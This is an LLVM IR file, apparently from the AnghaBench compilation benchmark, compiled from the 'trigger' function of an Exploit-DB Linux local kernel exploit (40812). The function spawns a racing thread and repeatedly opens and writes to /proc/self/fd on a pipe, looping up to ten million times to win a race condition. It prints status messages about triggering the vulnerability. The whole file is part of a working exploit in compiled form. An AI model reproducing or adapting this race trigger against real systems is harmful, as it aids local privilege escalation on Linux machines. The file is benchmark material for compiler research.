; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40812.c_trigger.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40812.c_trigger.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }

@SIGPIPE = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@go_go_speed_racer = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [49 x i8] c" [+] We'll let this go for a while if needed...\0A\00", align 1
@exp_state = common dso_local global %struct.TYPE_2__* null, align 8
@pipefd = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [17 x i8] c"/proc/self/fd/%d\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@O_NONBLOCK = common dso_local global i32 0, align 4
@is_old_kernel = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c" [+] Failed to trigger the vulnerability.  Is this a single processor machine with CONFIG_PREEMPT_NONE=y?\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @trigger() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [128 x i8], align 16
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  %5 = load i32, i32* @SIGPIPE, align 4
  %6 = load i32, i32* @SIG_IGN, align 4
  %7 = call i32 @signal(i32 %5, i32 %6)
  %8 = load i32, i32* @go_go_speed_racer, align 4
  %9 = call i32 @start_thread(i32 %8, i32* null)
  %10 = load i32, i32* @stdout, align 4
  %11 = call i32 @fprintf(i32 %10, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* @stdout, align 4
  %13 = call i32 @fflush(i32 %12)
  br label %14

14:                                               ; preds = %47, %0
  %15 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %16 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %15, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %22, label %19

19:                                               ; preds = %14
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 10000000
  br label %22

22:                                               ; preds = %19, %14
  %23 = phi i1 [ false, %14 ], [ %21, %19 ]
  br i1 %23, label %24, label %50

24:                                               ; preds = %22
  %25 = load i32*, i32** @pipefd, align 8
  %26 = getelementptr inbounds i32, i32* %25, i64 1
  %27 = load i32, i32* %26, align 4
  store i32 %27, i32* %3, align 4
  %28 = getelementptr inbounds [128 x i8], [128 x i8]* %2, i64 0, i64 0
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @sprintf(i8* %28, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0), i32 %29)
  %31 = getelementptr inbounds [128 x i8], [128 x i8]* %2, i64 0, i64 0
  %32 = load i32, i32* @O_WRONLY, align 4
  %33 = load i32, i32* @O_NONBLOCK, align 4
  %34 = or i32 %32, %33
  %35 = call i32 @open(i8* %31, i32 %34)
  store i32 %35, i32* %3, align 4
  %36 = load i32, i32* %3, align 4
  %37 = icmp sge i32 %36, 0
  br i1 %37, label %38, label %47

38:                                               ; preds = %24
  %39 = load i64, i64* @is_old_kernel, align 8
  %40 = icmp ne i64 %39, 0
  %41 = zext i1 %40 to i64
  %42 = select i1 %40, i32 0, i32 1
  store i32 %42, i32* null, align 4
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @write(i32 %43, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %45 = load i32, i32* %3, align 4
  %46 = call i32 @close(i32 %45)
  br label %47

47:                                               ; preds = %38, %24
  %48 = load i32, i32* %4, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %4, align 4
  br label %14

50:                                               ; preds = %22
  %51 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %58, label %55

55:                                               ; preds = %50
  %56 = load i32, i32* @stdout, align 4
  %57 = call i32 @fprintf(i32 %56, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %59

58:                                               ; preds = %50
  store i32 1, i32* %1, align 4
  br label %59

59:                                               ; preds = %58, %55
  %60 = load i32, i32* %1, align 4
  ret i32 %60
}

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @start_thread(i32, i32*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
